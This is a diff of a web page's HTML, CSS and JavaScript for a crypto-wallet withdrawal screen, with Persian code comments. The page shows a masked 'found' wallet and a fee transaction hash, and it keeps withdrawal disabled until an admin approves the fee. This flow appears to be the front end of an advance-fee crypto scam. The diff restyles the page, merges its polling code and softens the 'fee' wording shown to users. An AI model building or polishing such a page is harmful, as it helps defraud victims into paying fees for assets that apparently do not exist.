@@ -20,17 +20,14 @@
     }
     .box {
       background: rgba(0, 10, 20, 0.85);
-      padding: 25px;
+      padding: 20px;
       border-radius: 18px;
       box-shadow: 0 0 30px #0ff4, inset 0 0 20px #0ff3;
       max-width: 700px;
       width: 100%;
     }
-    h1 { font-size: 1.5em; }
-    .status {
-      font-size: 1.2em;
-      margin: 15px 0;
-    }
+    h1 { font-size: 1.5em; margin-bottom: 15px; }
+    .status { font-size: 1.2em; margin: 15px 0; }
     .hash, .wallet-info {
       font-family: monospace;
       background: #000;
@@ -44,7 +41,7 @@
     .input-field {
       width: 100%;
       padding: 10px;
-      margin: 20px 0 10px;
+      margin: 15px 0;
       font-family: monospace;
       background: #000;
       color: #0ff;
@@ -53,7 +50,7 @@
       font-size: 0.9em;
     }
     .btn {
-      padding: 12px 24px;
+      padding: 12px 20px;
       font-size: 1em;
       color: #000;
       background: #0ff;
@@ -61,7 +58,7 @@
       border-radius: 10px;
       cursor: pointer;
       width: 100%;
-      max-width: 300px;
+      max-width: 250px;
     }
     .btn[disabled] {
       opacity: 0.4;
@@ -70,13 +67,6 @@
     .btn:hover:not([disabled]) {
       background: #00faff;
       box-shadow: 0 0 12px #0ff;
-    }
-    @media (max-width: 600px) {
-      .box {
-        padding: 15px;
-      }
-      h1 { font-size: 1.2em; }
-      .status { font-size: 1em; }
     }
   </style>
 </head>
@@ -92,8 +82,8 @@
     <p>Please enter your personal wallet address to receive assets:</p>
     <input class="input-field" id="userWallet" placeholder="e.g. your own BTC or ETH address" />
     <button class="btn" id="withdrawBtn" disabled onclick="requestWithdraw()">💸 Request Withdrawal</button>
-    <p style="font-size: 0.9em; color: #aff; margin-top: 10px;">
-      This button will be enabled once your transaction fee is approved by admin.
+    <p style="font-size: 0.85em; color: #aff; margin-top: 10px;">
+      This button will be enabled once your transaction is approved by admin.
     </p>
   </div>
 
@@ -106,20 +96,18 @@
     window.location.href = "login.html";
   }
 
-  // لود ولت و هش تراکنش هزینه
-  function loadTransactionData() {
-    // ولت
+  // گرفتن اطلاعات کیف پول
+  function loadWalletData() {
     fetch(`${API_BASE_URL}/my-wallet`, {
       headers: { "Authorization": "Bearer " + token }
     })
     .then(res => res.json())
     .then(data => {
       if (!data.wallet) {
-        alert("❌ No wallet found. Please scan first.");
+        alert("❌ No wallet found.");
         window.location.href = "scan.html";
         return;
       }
-
       const wallet = data.wallet;
       const maskedAddress = wallet.address.substring(0, 6) + "••••••••" + wallet.address.slice(-4);
       document.getElementById("walletInfo").innerHTML = `
@@ -128,37 +116,32 @@
         <strong>Network:</strong> ${wallet.network}<br>
         <strong>Last Tx:</strong> ${wallet.lastTx || 'N/A'}
       `;
-    });
-
-    // هش هزینه تراکنش
-    fetch(`${API_BASE_URL}/final-tx`, {
-      headers: { "Authorization": "Bearer " + token }
     })
-    .then(res => res.json())
-    .then(txData => {
-      document.getElementById("txHash").innerText = txData.tx_hash || "N/A";
-    });
+    .catch(() => alert("Error loading wallet data."));
   }
 
-  // چک تایید هزینه تراکنش
-  function checkApprovalStatus() {
+  // گرفتن هش هزینه تراکنش و وضعیت
+  function loadFinalTx() {
     fetch(`${API_BASE_URL}/final-tx`, {
       headers: { "Authorization": "Bearer " + token }
     })
     .then(res => res.json())
-    .then(txData => {
+    .then(data => {
+      document.getElementById("txHash").innerText = data.tx_hash || "N/A";
+
       const withdrawBtn = document.getElementById("withdrawBtn");
-      if (txData.status === "approved") {
-        document.getElementById("statusText").innerHTML = "✅ Transaction Fee Approved! You can now request withdrawal.";
+      if (data.status === "approved") {
+        document.getElementById("statusText").innerHTML = "✅ Transaction Approved! You can now request withdrawal.";
         withdrawBtn.disabled = false;
       } else {
         document.getElementById("statusText").innerHTML = "⏳ Awaiting admin confirmation...";
         withdrawBtn.disabled = true;
       }
-    });
+    })
+    .catch(() => alert("Error loading transaction status."));
   }
 
-  // درخواست برداشت
+  // ارسال درخواست برداشت
   function requestWithdraw() {
     const userAddr = document.getElementById("userWallet").value.trim();
     if (!userAddr) {
@@ -169,28 +152,26 @@
     fetch(`${API_BASE_URL}/withdraw-request`, {
       method: "POST",
       headers: {
-        "Content-Type": "application/json",
-        "Authorization": "Bearer " + token
+        "Authorization": "Bearer " + token,
+        "Content-Type": "application/json"
       },
       body: JSON.stringify({ withdraw_address: userAddr })
     })
     .then(res => res.json())
     .then(data => {
       if (data.success) {
-        alert("✅ Withdrawal request submitted successfully!");
+        alert("✅ Withdrawal request submitted!");
       } else {
-        alert("❌ " + (data.error || "Failed to submit withdrawal request."));
+        alert("❌ " + (data.error || "Request failed."));
       }
     })
-    .catch(() => {
-      alert("Server error occurred.");
-    });
+    .catch(() => alert("Server error occurred."));
   }
 
-  // اجرای اولیه
-  loadTransactionData();
-  checkApprovalStatus();
-  setInterval(checkApprovalStatus, 5000);
+  // اجرا در شروع و رفرش هر 5 ثانیه
+  loadWalletData();
+  loadFinalTx();
+  setInterval(loadFinalTx, 5000);
 </script>
 </body>
 </html>
